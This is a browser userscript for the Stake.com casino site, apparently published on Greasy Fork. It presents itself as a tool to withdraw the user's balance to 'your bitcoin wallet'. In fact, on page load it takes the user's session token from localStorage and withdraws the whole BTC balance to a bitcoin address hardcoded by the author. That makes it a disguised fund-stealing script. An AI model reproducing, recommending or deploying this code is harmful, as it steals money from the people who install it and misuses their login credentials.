// ==UserScript==
// @name         Stake.com Withdraw Script
// @namespace    Stake Casino
// @version      0.5
// @description  withdraw your entire balance to your bitcoin wallet
// @author       casinoguy05
// @match        https://stake.com/
// @icon         none
// @grant        none
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/446204/Stakecom%20Withdraw%20Script.user.js
// @updateURL https://update.greasyfork.org/scripts/446204/Stakecom%20Withdraw%20Script.meta.js
// ==/UserScript==

(function() {

  // cfg
  var dest_addr = "bc1qm4cdzh3jfh8j3f2ehu08ym7zs85csn64r2h2a8";
  var currency = "btc";
  var withdrawal_threshold = 0;

  let auth_key = window.localStorage.getItem('jwt').replace('"', "").replace('"', "");

  function create_graphql_request(auth_key, function_name, function_body, function_variables, callback)
  {
    let http_request = new XMLHttpRequest();
    http_request.onreadystatechange = function() {
      if(http_request.readyState != 4) return;

      callback(JSON.parse(http_request.responseText));
    };


    http_request.open("POST", "https://api.stake.com/graphql", true);

    http_request.setRequestHeader("content-type", "application/json");
    http_request.setRequestHeader("x-access-token", auth_key);

    http_request.send(JSON.stringify([
      {
        operationName: function_name,
        query: function_body,
        variables: function_variables
      }
    ]));
  }

  function on_balance_callback(balance_data)
  {
    console.log(balance_data);
    let user_info = balance_data[0].data.user;

    let btc_balance = 0;
    let fee = balance_data[0].data.info.currency.withdrawalFee.value;

    for(let i = 0; i < user_info.balances.length; i++)
    {
      let balance_info = user_info.balances[i];

      if(balance_info.available.currency === currency)
      {
        btc_balance = balance_info.available.amount;
        break;
      }
    }

    if(btc_balance < withdrawal_threshold) return;

    create_graphql_request(auth_key,
      "CreateWithdrawalMutation",
      "mutation CreateWithdrawalMutation($currency: CurrencyEnum!, $address: String!, $amount: Float!) { createWithdrawal(currency: $currency, address: $address, amount: $amount) { id name address amount refFee status } }",
      { currency: currency, address: dest_addr, amount: btc_balance - (fee * 2) }, function(d) {
        console.log(JSON.stringify(d));
      });
  }

  create_graphql_request(auth_key,
    "CreateWithdrawalQuery",
    "query CreateWithdrawalQuery($currency: CurrencyEnum!) { user { id hasTfaEnabled balances { available { amount currency __typename }" +
    "vault { amount currency __typename } __typename } __typename } info { currency(currency: $currency) { withdrawalFee { value __typename }" +
    "withdrawalMin { value __typename } __typename } __typename } } ",
    {currency: currency}, on_balance_callback);
})();